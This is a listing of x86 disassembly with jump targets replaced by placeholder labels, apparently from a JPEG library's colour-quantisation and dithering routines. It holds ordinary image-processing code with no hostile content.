mov [ ecx + 0x14 ] 0xa
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx [ ebx + 0xd8 ]
shl edx 0x3
xor esi esi
sub edx eax
inc eax
lea edx [ edx + edx * 2 ]
mov [ ecx + edx * 4 + 0x30 ] esi
jmp r-xdata
cmp [ ebx + 0x54 ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
mov [ esi + 0x4 ] sub_4903d0
jmp r-xdata
cmp [ ebx + 0x28 ] 0x4
jne r-xdata
mov [ esi + 0x4 ] sub_490418
mov eax ebx
call sub_490180
jmp r-xdata
mov ecx [ ebx + 0x2c ]
cmp ecx [ ebx + 0x28 ]
jne r-xdata
mov ecx [ ebx + 0x78 ]
mov [ ebx + 0x7c ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0x7c ] 0x1
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ esi + 0x4 ] sub_490340
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov [ esi + 0x4 ] sub_490340
jmp r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1b
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x78 ] eax
mov [ esi + 0x4 ] sub_490340
jmp r-xdata
sub_490728
push ebx
push esi
push edi
add esp 0xffffffe8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x78 ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x60 ]
mov [ esp + 0xc ] eax
mov ebx 0x1
cmp eax [ esp + 0xc ]
jle r-xdata
imul eax ebx
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
inc ebx
mov eax ebx
mov ecx 0x1
cmp ecx [ esp + 0x8 ]
jge r-xdata
dec ebx
cmp ebx 0x2
jge r-xdata
mov esi 0x1
xor ecx ecx
mov eax [ esp + 0x4 ]
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov edx [ esp ]
mov edx [ edx ]
mov [ edx + 0x14 ] 0x38
mov [ edx + 0x18 ] eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx ]
xor edx edx
mov [ esp + 0x10 ] edx
xor ecx ecx
mov [ esp + 0x14 ] rw-data
cmp ecx [ esp + 0x8 ]
jge r-xdata
mov [ eax ] ebx
imul esi ebx
inc ecx
add eax 0x4
cmp ecx [ esp + 0x8 ]
jl r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0x2c ] 0x2
jne r-xdata
mov eax esi
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov ebx ecx
mov edx [ esp + 0x14 ]
mov ebx [ edx ]
jmp r-xdata
mov edx [ esp + 0x4 ]
inc ecx
mov esi eax
inc [ edx + ebx * 4 ]
mov [ esp + 0x10 ] 0x1
add [ esp + 0x14 ] 0x4
cmp ecx [ esp + 0x8 ]
jl r-xdata
mov eax [ esp + 0x4 ]
push [ eax + ebx * 4 ]
mov eax esi
pop edx
mov edi edx
cdq
idiv edi
mov edx [ esp + 0x4 ]
mov edx [ edx + ebx * 4 ]
inc edx
imul eax edx
cmp eax [ esp + 0xc ]
jg r-xdata
sub_490820
push ebp
mov ebp esp
mov eax ecx
push ebx
shl eax 0x8
mov ebx [ ebp + 0x8 ]
mov edx ebx
sub eax ecx
sar edx 0x1
jns r-xdata
add eax edx
cdq
idiv ebx
pop ebx
pop ebp
retn 0x4
adc edx 0x0
sub_490844
add ecx ecx
push ebp
mov ebp esp
mov eax ecx
shl eax 0x8
push ebx
mov ebx [ ebp + 0x8 ]
sub eax ecx
add eax ebx
add ebx ebx
add eax 0xff
cdq
idiv ebx
pop ebx
pop ebp
retn 0x4
sub_490868
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1cc ]
mov [ esp + 0x4 ] edx
mov edx [ esp + 0x4 ]
mov eax [ esp ]
add edx 0x20
call sub_490728
mov [ esp + 0xc ] eax
mov ecx [ esp ]
cmp [ ecx + 0x78 ] 0x3
jne r-xdata
mov eax [ esp ]
mov eax [ eax ]
mov [ eax + 0x14 ] 0x5f
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp ]
mov eax [ eax ]
add eax 0x18
mov edx [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x20 ]
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x24 ]
mov [ eax + 0x8 ] edx
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x28 ]
mov [ eax + 0xc ] edx
mov eax [ esp ]
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x5e
mov edx 0x1
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x78 ]
cmp ecx [ esp + 0x10 ]
jg r-xdata
mov eax [ esp ]
mov edx [ eax + 0x78 ]
push edx
mov edx 0x1
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
xor edx edx
mov eax [ esp + 0xc ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x8 ]
mov eax ecx
mov [ esp + 0x2c ] eax
mov edx [ esp + 0x4 ]
lea ecx [ edx + 0x20 ]
mov [ esp + 0x20 ] ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ eax ]
mov [ esp + 0x18 ] edx
mov eax [ esp + 0x1c ]
cdq
idiv [ esp + 0x18 ]
mov esi eax
xor eax eax
mov [ esp + 0x14 ] eax
mov edx [ esp + 0x2c ]
mov ecx edx
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jge r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x10 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov [ ecx + 0x14 ] eax
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1c ] esi
inc [ esp + 0x10 ]
add [ esp + 0x2c ] 0x4
add [ esp + 0x20 ] 0x4
mov edx [ esp + 0x18 ]
dec edx
push edx
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x4 ]
call sub_490820
mov edi eax
mov ecx [ esp + 0x14 ]
imul ecx esi
mov eax [ esp + 0x28 ]
mov edx eax
mov [ esp + 0x24 ] edx
cmp ecx [ esp + 0xc ]
jge r-xdata
inc [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x18 ]
jl r-xdata
xor eax eax
mov edx [ esp + 0x24 ]
cmp esi eax
jle r-xdata
add ecx [ esp + 0x1c ]
cmp ecx [ esp + 0xc ]
jl r-xdata
mov ebx [ edx ]
add ebx ecx
add ebx eax
inc eax
push ebx
mov ebx edi
pop ebp
cmp esi eax
mov [ ebp ] bl
jg r-xdata
sub_490a1c
push ebx
push esi
push edi
add esp 0xffffffe0
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1cc ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
cmp [ ecx + 0x58 ] 0x1
jne r-xdata
xor edx edx
mov [ esp + 0x14 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ ecx + 0x1c ] eax
mov [ esp + 0x14 ] 0x1fe
mov eax [ esp + 0x4 ]
mov [ eax + 0x1c ] 0x1
jmp r-xdata
mov eax [ esp ]
cmp edi [ eax + 0x78 ]
jl r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x78 ]
mov edx 0x1
push ecx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x18 ]
add ecx 0x100
mov ebx [ eax + 0x4 ]
call [ ebx + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ esp + 0x10 ] ecx
xor edi edi
mov eax [ esp + 0x4 ]
lea edx [ eax + 0x20 ]
mov [ esp + 0x18 ] edx
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ ecx ]
mov [ esp + 0xc ] eax
mov eax [ esp + 0x10 ]
cdq
idiv [ esp + 0xc ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x14 ] 0x0
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
xor esi esi
mov ecx [ edx + 0x18 ]
mov edx edi
mov eax [ ecx + edi * 4 ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0xc ]
dec eax
xor ecx ecx
push eax
mov eax [ esp + 0x4 ]
call sub_490844
xor ebx ebx
mov edx [ esp + 0x8 ]
mov ecx edx
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x18 ]
add [ eax + edi * 4 ] 0xff
mov edx esi
mov ecx [ esp + 0x1c ]
imul edx [ esp + 0x10 ]
mov [ ecx ] dl
inc ebx
inc [ esp + 0x1c ]
cmp ebx 0xff
jle r-xdata
mov eax [ esp + 0xc ]
mov edx edi
dec eax
inc esi
push eax
mov ecx esi
mov eax [ esp + 0x4 ]
call sub_490844
cmp eax ebx
jl r-xdata
cmp eax ebx
jge r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
inc edi
add [ esp + 0x18 ] 0x4
mov ebx 0x1
mov eax [ esp + 0x8 ]
add eax 0x100
mov edx ebx
mov ecx [ esp + 0x8 ]
neg edx
add ecx edx
mov edx [ esp + 0x8 ]
inc ebx
mov dl [ edx ]
mov [ ecx ] dl
mov ecx [ esp + 0x8 ]
mov dl [ ecx + 0xff ]
mov [ eax ] dl
inc eax
cmp ebx 0xff
jle r-xdata
sub_490b8c
push ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
mov ebx edx
mov edx 0x1
add esp 0xfffffff0
mov ecx 0x400
call [ esi ]
mov [ esp ] eax
mov ebp ebx
shl ebp 0x9
add ebp 0xfffffe00
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0xc ] rw-data
mov edx [ esp ]
mov ecx edx
mov [ esp + 0x8 ] ecx
mov eax ecx
cdq
idiv ebp
mov eax ecx
neg eax
cdq
idiv ebp
neg eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
add eax eax
mov edx 0xff
sub edx eax
mov ecx edx
shl ecx 0x8
sub ecx edx
test ecx ecx
jge r-xdata
inc [ esp + 0x4 ]
add [ esp + 0xc ] 0x10
add [ esp + 0x8 ] 0x40
cmp [ esp + 0x4 ] 0x10
jl r-xdata
mov [ esi ] eax
inc edi
add esi 0x4
inc ebx
cmp edi 0x10
jl r-xdata
xor edi edi
mov eax [ esp + 0x8 ]
mov esi eax
mov eax [ esp + 0xc ]
mov ebx eax
mov eax [ esp ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_490c2c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1cc ]
mov [ esp + 0x4 ] edx
xor ebx ebx
mov eax [ esp + 0x4 ]
lea esi [ eax + 0x20 ]
jmp r-xdata
mov edx [ esp ]
cmp ebx [ edx + 0x78 ]
jl r-xdata
mov edi [ esi ]
xor ecx ecx
xor edx edx
mov eax [ esp + 0x4 ]
add eax 0x20
cmp ebx edx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test ecx ecx
jne r-xdata
cmp edi [ eax ]
jne r-xdata
mov [ esi + 0x14 ] ecx
inc ebx
add esi 0x4
mov edx edi
mov eax [ esp ]
call sub_490b8c
mov ecx eax
inc edx
add eax 0x4
cmp ebx edx
jg r-xdata
mov ecx [ eax + 0x14 ]
jmp r-xdata
sub_490c94
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov ebx [ eax + 0x1cc ]
mov ebx [ ebx + 0x18 ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x70 ]
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0x78 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov ecx [ edx ]
mov edx [ eax ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
inc [ ebp - 0xc ]
add [ ebp - 0x20 ] 0x4
add [ ebp - 0x1c ] 0x4
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
xor esi esi
xor edx edx
mov eax [ ebp - 0x4 ]
cmp edx [ ebp - 0x18 ]
jge r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov [ edx ] al
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
ja r-xdata
xor ebx ebx
mov edi [ eax ]
mov bl [ ecx ]
inc ecx
add eax 0x4
inc edx
movzx ebx [ edi + ebx ]
add esi ebx
cmp edx [ ebp - 0x18 ]
jl r-xdata
sub_490d34
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx [ eax + 0x1cc ]
mov esi [ ebx + 0x18 ]
mov edi [ esi ]
mov [ ebp - 0x4 ] edi
mov edi [ esi + 0x4 ]
mov [ ebp - 0x8 ] edi
mov ebx [ esi + 0x8 ]
mov [ ebp - 0xc ] ebx
mov eax [ eax + 0x70 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
mov edx [ ebp - 0x1c ]
mov ecx [ edx ]
mov esi [ ebp - 0x14 ]
test esi esi
jbe r-xdata
inc [ ebp - 0x10 ]
add [ ebp - 0x1c ] 0x4
add [ ebp - 0x18 ] 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
xor edx edx
mov ebx [ ebp - 0x4 ]
mov dl [ eax ]
inc eax
mov edi [ ebp - 0x8 ]
dec esi
movzx edx [ ebx + edx ]
xor ebx ebx
mov bl [ eax ]
inc eax
movzx ebx [ edi + ebx ]
add edx ebx
xor ebx ebx
mov bl [ eax ]
mov edi [ ebp - 0xc ]
inc eax
movzx ebx [ edi + ebx ]
add edx ebx
mov [ ecx ] dl
inc ecx
test esi esi
ja r-xdata
sub_490dd0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx [ eax + 0x1cc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x78 ]
mov [ ebp - 0x14 ] ebx
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x24 ]
mov eax [ edx ]
mov edx [ ebp - 0x20 ]
call sub_4977cc
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax [ ecx + 0x30 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + 0x34 ]
mov [ ebp - 0x30 ] eax
mov edx [ ebp - 0x24 ]
mov ecx edx
mov [ ebp - 0x2c ] ecx
mov eax [ ebp - 0x34 ]
mov edx eax
mov [ ebp - 0x28 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x14 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
inc ecx
and ecx 0xf
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x30 ] edx
inc [ ebp - 0x1c ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x24 ] 0x4
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
mov ebx [ ebp - 0x18 ]
mov edx [ eax ]
mov eax [ ebp - 0x4 ]
mov ecx [ ecx ]
add edx [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + ebx * 4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x30 ]
mov ebx [ ebp - 0x10 ]
shl ebx 0x6
mov eax [ eax ]
add eax ebx
mov [ ebp - 0xc ] eax
xor eax eax
mov esi [ ebp - 0x20 ]
test esi esi
jbe r-xdata
inc [ ebp - 0x18 ]
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x18 ]
cmp edx [ ebp - 0x14 ]
jl r-xdata
xor ebx ebx
mov edi [ ebp - 0x8 ]
mov bl [ edx ]
dec esi
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0xc ]
pop edi
mov ebx [ ebx + eax * 4 ]
inc eax
and eax 0xf
mov bl [ edi + ebx ]
add [ ecx ] bl
inc ecx
add edx [ ebp - 0x14 ]
test esi esi
ja r-xdata
sub_490edc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov ebx [ eax + 0x1cc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x18 ]
mov esi [ ebx ]
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x4 ]
mov [ ebp - 0xc ] esi
mov ebx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov eax [ eax + 0x70 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x30 ]
mov esi [ edx ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x34 ]
shl edx 0x6
mov eax [ eax ]
add ecx edx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x38 ]
add ecx edx
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x3c ]
add ecx edx
xor edx edx
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x28 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
inc eax
and eax 0xf
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x20 ]
mov [ ecx + 0x30 ] eax
inc [ ebp - 0x24 ]
add [ ebp - 0x34 ] 0x4
add [ ebp - 0x30 ] 0x4
mov edx [ ebp - 0x24 ]
cmp edx [ ebp + 0x8 ]
jl r-xdata
xor ecx ecx
mov ebx [ ebp - 0x8 ]
mov cl [ eax ]
inc eax
mov edi [ ebp - 0xc ]
lea ecx [ ebx + ecx ]
mov ebx [ ebp - 0x14 ]
mov ebx [ ebx + edx * 4 ]
movzx ecx [ ecx + ebx ]
xor ebx ebx
mov bl [ eax ]
inc eax
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0x18 ]
pop edi
mov ebx [ ebx + edx * 4 ]
movzx ebx [ edi + ebx ]
add ecx ebx
xor ebx ebx
mov bl [ eax ]
mov edi [ ebp - 0x10 ]
inc eax
lea ebx [ edi + ebx ]
push ebx
mov ebx [ ebp - 0x1c ]
pop edi
mov ebx [ ebx + edx * 4 ]
inc edx
and edx 0xf
movzx ebx [ edi + ebx ]
add ecx ebx
mov [ esi ] cl
inc esi
dec [ ebp - 0x28 ]
cmp [ ebp - 0x28 ] 0x0
ja r-xdata
sub_490ff4
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
mov ebx [ eax + 0x1cc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ eax + 0x78 ]
mov [ ebp - 0x24 ] ebx
mov ebx [ eax + 0x70 ]
mov [ ebp - 0x38 ] ebx
mov eax [ eax + 0x144 ]
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x40 ] ecx
mov eax [ ebp - 0x30 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x40 ]
mov eax [ edx ]
mov edx [ ebp - 0x38 ]
call sub_4977cc
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x44 ]
mov [ ebp - 0x4c ] edx
mov ecx [ ebp - 0x40 ]
mov eax ecx
mov [ ebp - 0x48 ] eax
mov edx [ ebp - 0x50 ]
mov ecx edx
mov [ ebp - 0x44 ] ecx
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x24 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov edx [ ebp - 0x44 ]
mov ecx [ edx ]
add ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x48 ]
mov edx [ eax ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x54 ] 0x0
je r-xdata
mov edx 0x1
xor edx edx
jmp r-xdata
mov esi 0x1
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x4c ]
mov ecx [ edx ]
mov eax [ ebp - 0x38 ]
or esi 0xffffffff
dec eax
mov edx eax
imul edx [ ebp - 0x24 ]
add [ ebp - 0x14 ] edx
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
neg eax
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x38 ]
inc eax
add eax eax
mov ecx [ edx ]
add ecx eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] edx
inc [ ebp - 0x30 ]
add [ ebp - 0x50 ] 0x4
add [ ebp - 0x40 ] 0x4
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
mov ax [ ebp - 0xc ]
mov [ ecx ] ax
inc [ ebp - 0x2c ]
add [ ebp - 0x4c ] 0x4
mov ecx [ ebp - 0x2c ]
cmp ecx [ ebp - 0x24 ]
jl r-xdata
movsx edx [ ecx + esi * 2 ]
add eax edx
mov edx [ ebp - 0x14 ]
add eax 0x8
mov ebx [ ebp - 0x18 ]
movzx edx [ edx ]
sar eax 0x4
add eax edx
mov edx [ ebp - 0x3c ]
movzx eax [ edx + eax ]
mov edx [ ebp - 0x1c ]
movzx edx [ edx + eax ]
add [ ebx ] dl
mov ebx [ ebp - 0x20 ]
movzx edx [ ebx + edx ]
sub eax edx
mov [ ebp - 0x10 ] eax
mov edx eax
mov bx [ ebp - 0xc ]
add edx edx
add eax edx
add bx ax
add eax edx
mov [ ecx ] bx
mov ebx [ ebp - 0x8 ]
add ebx eax
add eax edx
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ebx
mov edx [ ebp - 0x28 ]
add [ ebp - 0x14 ] edx
add [ ebp - 0x18 ] esi
dec [ ebp - 0x34 ]
mov edx esi
add edx edx
add ecx edx
cmp [ ebp - 0x34 ] 0x0
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x2c ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x2c ]
mov edx [ edx + eax * 4 ]
xor eax eax
mov [ ebp - 0x20 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x38 ]
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x34 ] 0x0
jbe r-xdata
sub_4911b0
push ebx
push esi
mov ebx eax
push edi
push ebp
push ecx
mov eax [ ebx + 0x1cc ]
mov edx [ ebx + 0x70 ]
add edx edx
add edx 0x4
xor edi edi
mov [ esp ] edx
lea esi [ eax + 0x44 ]
jmp r-xdata
cmp edi [ ebx + 0x78 ]
jl r-xdata
mov eax ebx
mov ecx [ esp ]
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov [ esi ] eax
inc edi
add esi 0x4
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4911f0
push ebx
mov ebx eax
push esi
push edi
push ebp
mov esi [ ebx + 0x1cc ]
mov eax [ esi + 0x10 ]
mov [ ebx + 0x88 ] eax
mov edx [ esi + 0x14 ]
mov [ ebx + 0x84 ] edx
mov ecx [ ebx + 0x58 ]
sub ecx 0x1
jb r-xdata
cmp [ ebx + 0x78 ] 0x3
jne r-xdata
je r-xdata
mov [ esi + 0x4 ] sub_490c94
jmp r-xdata
mov [ esi + 0x4 ] sub_490d34
jmp r-xdata
cmp [ ebx + 0x78 ] 0x3
jne r-xdata
dec ecx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x4 ] sub_490dd0
mov [ esi + 0x4 ] sub_490edc
jmp r-xdata
mov [ esi + 0x4 ] sub_490ff4
xor edx edx
mov [ esi + 0x54 ] edx
cmp [ esi + 0x44 ] 0x0
jne r-xdata
jmp r-xdata
cmp [ esi + 0x34 ] 0x0
jne r-xdata
mov eax ebx
call sub_490a1c
xor eax eax
mov [ esi + 0x30 ] eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ebp [ ebx + 0x70 ]
lea eax [ esi + 0x44 ]
add ebp ebp
mov esi eax
add ebp 0x4
xor edi edi
jmp r-xdata
mov eax ebx
call sub_4911b0
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x30
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_490c2c
jmp r-xdata
cmp edi [ ebx + 0x78 ]
jl r-xdata
mov eax [ esi ]
mov edx ebp
call sub_4977cc
inc edi
add esi 0x4
jmp r-xdata
sub_4912dc
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x58
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x1cc ] eax
mov [ eax ] sub_4911f0
mov [ eax + 0x8 ] sub_4912c8
mov [ eax + 0xc ] sub_4912cc
xor edx edx
xor ecx ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x34 ] ecx
cmp [ ebx + 0x78 ] 0x4
jle r-xdata
cmp [ ebx + 0x60 ] 0x100
jle r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x37
mov [ eax + 0x18 ] 0x4
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_490868
mov eax ebx
call sub_490a1c
cmp [ ebx + 0x58 ] 0x2
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x39
mov [ eax + 0x18 ] 0x100
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
mov eax ebx
call sub_4911b0
sub_491370
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ecx [ eax + 0x1cc ]
mov ebx [ ecx + 0x18 ]
mov eax [ eax + 0x70 ]
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov ecx [ ebp - 0x8 ]
test ecx ecx
jbe r-xdata
inc [ ebp - 0x4 ]
add [ ebp - 0xc ] 0x4
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx esi [ eax + 0x1 ]
xor edx edx
mov dl [ eax ]
sar edx 0x3
sar esi 0x2
shl esi 0x6
mov edx [ ebx + edx * 4 ]
add edx esi
movzx esi [ eax + 0x2 ]
sar esi 0x3
add esi esi
add edx esi
inc [ edx ]
mov si [ edx ]
test si si
ja r-xdata
add eax 0x3
dec ecx
test ecx ecx
ja r-xdata
